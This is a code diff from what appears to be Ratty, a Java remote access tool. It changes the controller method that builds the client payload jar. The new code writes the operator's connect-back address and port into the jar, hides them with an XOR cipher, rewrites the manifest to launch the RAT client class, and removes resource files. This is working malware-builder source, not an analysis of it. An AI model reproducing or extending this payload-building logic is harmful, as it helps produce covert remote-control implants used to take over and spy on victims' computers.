@@ -60,8 +60,10 @@ public final class RattyGuiController extends AbstractRattyController implements
 	
 	private HashMap<ActiveConnection, ServerClient> clients;
 	
-	private static final String BUILDER_REPLACEMENT = "data";
-	private static final String BUILDER_REPLACEMENT_FORMAT = "%s\r\n%s\r\ntrue";
+	private static final String BUILDER_DATA_REPLACEMENT = "data";
+	private static final String BUILDER_DATA_REPLACEMENT_FORMAT = "%s" + System.lineSeparator() + "%s";
+	private static final String BUILDER_MANIFEST_REPLACEMENT = "META-INF/MANIFEST.MF";
+	private static final byte[] BUILDER_MANIFEST_REPLACEMENT_DATA = ("Manifest-Version: 1.0" + System.lineSeparator() + "Class-Path: ." + System.lineSeparator() + "Main-Class: de.sogomn.rat.Client" + System.lineSeparator() + System.lineSeparator()).getBytes();
 	private static final String[] BUILDER_REMOVALS = {
 		"ping.wav",
 		"lato.ttf",
@@ -401,19 +403,21 @@ public final class RattyGuiController extends AbstractRattyController implements
 			return;
 		}
 		
-		final String replacementString = String.format(BUILDER_REPLACEMENT_FORMAT, address, port);
-		final byte[] replacementData = replacementString.getBytes();
+		final String dataReplacementString = String.format(BUILDER_DATA_REPLACEMENT_FORMAT, address, port);
+		final byte[] dataReplacement = dataReplacementString.getBytes();
 		
-		XorCipher.crypt(replacementData);
+		XorCipher.crypt(dataReplacement);
 		
 		try {
-			JarBuilder.build(destination, BUILDER_REPLACEMENT, replacementData);
+			JarBuilder.copy(destination);
+			JarBuilder.replaceFile(destination, BUILDER_DATA_REPLACEMENT, dataReplacement);
+			JarBuilder.replaceFile(destination, BUILDER_MANIFEST_REPLACEMENT, BUILDER_MANIFEST_REPLACEMENT_DATA);
 			
 			for (final String removal : BUILDER_REMOVALS) {
 				JarBuilder.removeFile(destination, removal);
 			}
 		} catch (final IOException ex) {
-			gui.showError(BUILDER_ERROR_MESSAGE + "\r\n" + ex.getMessage());
+			gui.showError(BUILDER_ERROR_MESSAGE + System.lineSeparator() + ex.getMessage());
 		}
 	}
 	
